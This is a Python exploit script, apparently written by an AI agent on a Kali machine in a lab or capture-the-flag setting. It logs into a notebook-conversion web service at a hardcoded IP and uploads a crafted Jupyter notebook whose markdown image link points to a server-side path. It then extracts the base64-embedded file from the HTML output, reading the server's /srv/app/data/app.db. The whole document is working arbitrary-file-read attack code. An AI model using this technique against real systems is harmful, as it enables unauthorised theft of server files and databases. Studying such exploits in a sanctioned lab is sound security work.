#!/usr/bin/env python3
import base64
import json
import re
import sys

import requests

BASE = "http://154.57.164.74:31448"
s = requests.Session()

USER = "pentestX1"
PASS = "Password123!"

def login():
    r = s.post(f"{BASE}/", data={"username": USER, "password": PASS})
    print("login:", r.status_code, r.url)

login()

def read_file(path, outfile):
    nb = {
        "cells": [
            {
                "cell_type": "markdown",
                "metadata": {},
                "source": [f"![leak]({path})"]
            }
        ],
        "metadata": {
            "kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"},
            "language_info": {"name": "python", "version": "3.11.0"}
        },
        "nbformat": 4,
        "nbformat_minor": 5
    }
    fname = "/tmp/claude-1000/-home-kali/f706f2bc-ef6c-429b-8b1f-50ee8e8d1e7e/scratchpad/leak.ipynb"
    with open(fname, "w") as f:
        json.dump(nb, f)

    with open(fname, "rb") as f:
        r = s.post(f"{BASE}/convert", files={"notebook": ("leak.ipynb", f, "application/octet-stream")},
                   data={"format": "html"}, allow_redirects=True)
    job_id = r.url.rstrip("/").split("/")[-1]
    print("job:", job_id, r.status_code)

    r2 = s.get(f"{BASE}/jobs/{job_id}")
    if "could not be completed" in r2.text:
        print(f"FAILED to read {path}")
        return None

    r3 = s.get(f"{BASE}/jobs/{job_id}/download")
    m = re.search(r'src="data:([^;]+);base64,([^"]+)"', r3.text)
    if not m:
        print("no data URI found in output for", path)
        print(r3.text[:3000])
        return None
    mime, b64data = m.groups()
    data = base64.b64decode(b64data)
    with open(outfile, "wb") as f:
        f.write(data)
    print(f"read {path} -> {outfile} ({len(data)} bytes, mime={mime})")
    return data

read_file("/srv/app/data/app.db", "/tmp/claude-1000/-home-kali/f706f2bc-ef6c-429b-8b1f-50ee8e8d1e7e/scratchpad/app.db")
